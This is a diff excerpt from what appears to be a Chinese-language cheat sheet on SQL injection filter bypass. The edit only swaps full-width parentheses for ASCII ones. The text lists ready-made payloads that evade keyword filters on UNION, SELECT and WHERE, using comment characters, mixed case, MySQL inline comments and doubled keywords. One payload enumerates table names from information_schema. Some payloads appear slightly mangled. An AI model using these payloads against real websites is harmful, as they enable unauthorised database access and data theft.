@@ -56,17 +56,17 @@ id=1' union select 1,2,'3
 使用like，regexp,或者使用>,<等
 
 绕过union，select，where等：
-（1）使用注释符绕过：
+(1)使用注释符绕过：
 常用注释符：//，-- , /**/, #, --+, -- -, ;,%00,--a
 用法：U// NION // SE// LECT //user，pwd from user
 
-（2）使用大小写绕过：
+(2)使用大小写绕过：
 id=-1'UnIoN/**/SeLeCT
 
-（3）内联注释绕过：
+(3)内联注释绕过：
 id=-1'/!UnIoN/ SeLeCT 1,2,concat(/!table_name/) FrOM /information_schema/.tables /!WHERE //!TaBlE_ScHeMa/ like database()#
 
-（4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）：
+(4)双关键字绕过（若删除掉第一个匹配的union就能绕过）：
 id=-1'UNIunionONSeLselectECT1,2,3–-
 
 
